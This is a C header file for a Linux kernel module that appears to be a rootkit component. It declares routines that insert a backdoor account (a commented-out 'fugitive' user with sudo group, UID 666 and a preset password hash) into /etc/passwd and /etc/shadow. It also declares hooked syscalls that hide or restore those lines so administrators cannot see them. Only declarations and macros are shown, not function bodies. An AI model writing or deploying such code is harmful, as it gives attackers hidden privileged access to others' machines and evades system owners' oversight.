#ifndef GHOST_H
#define GHOST_H

#include <linux/err.h>
#include <linux/errno.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
// needed for file io
#include <linux/fs.h>
#include <linux/slab.h>

#include "sctm.h"

#undef LINE_MAX

#define LINE_MAX PATH_MAX /* reasonable upper limit on a line from "/etc/[passwd|shadow]", solely for convenience */

#define PASSWD_PATH "/etc/passwd"
#define SHADOW_PATH "/etc/shadow"
#define GROUP_PATH "/etc/group"

/*#define EVIL_USERNAME "fugitive"
// /etc/passwd fields besides username
#define PASSWD "x"
#define UID "666"   // random uid, below 1000 to avoid conflict with user accounts
#define GID "27"    // 27 is sudo group on ubuntu
#define FULLNAME ""
#define DIR "/home/fugitive"
#define SHELL "/bin/bash"

// /etc/shadow fields besides username, password is "Password123"
#define PASSWD_SHA512 "$6$xBoTg.km$PKitMe/Qn6K4yoO.wrBSwvdtqSOc3Bfb5Mcn7S\
sUito2AtUGPzE0JB/g/Li23t5Zp8YjKUOB9czKl3yMYJO35."
#define LAST "0"
#define MAY "0"
#define MUST "99999"
#define WARN_DAYS "7"
#define EXPIRE ""
#define DISABLE ""
#define RESERVED ""*///disabled for now (prefer runtime input)

// /etc/group fields

// generates string that can be inserted into passwd and shadow files
#define PASSWD_GEN(_evil_username, _passwd, _uid, _gid, _fullname, _dir, _shell) \
        _evil_username ":" \
        _passwd ":" \
        _uid ":" \
        _gid ":" \
        _fullname ":" \
        _dir ":" \
        _shell "\n"

#define SHADOW_GEN(_evil_username, _passwd_sha512, _last, _may, _must, _warn_days, _expire, _disable, _reserved) \
        _evil_username ":" \
        _passwd_sha512 ":" \
        _last ":" \
        _may ":" \
        _must ":" \
        _warn_days ":" \
        _expire ":" \
        _disable ":" \
        _reserved "\n"
// #define GROUP_GEN() 

enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

static ssize_t append_to_file(char *, char *);

asmlinkage ssize_t erase_time(int fd, void *buf, size_t count);

/* remove lines from "/etc/passwd" and "/etc/shadow" */
int fugitive(const char __user *passwd, const char __user *shadow);

/* convert a character array into an unsigned integer */
static int fugitive__atoui(int *dest, const char *a);

int fugitive_exit(void);

int fugitive_init(struct sctm *sctm);

/* extract the UID from an "/etc/passwd" line */
static int fugitive__passwd_line_to_uid(uid_t *dest, const char *line);

static int has_fug(char *, char *);

int hide_fugitive(void);

asmlinkage int king_crimson(char *pathname, int flags, mode_t mode);

int show_fugitive(void);

asmlinkage int this_is_requiem(int fd);

/* restore lines in "/etc/passwd" and "/etc/shadow" */
int unfugitive(const char __user *passwd, const char __user *shadow);

#endif

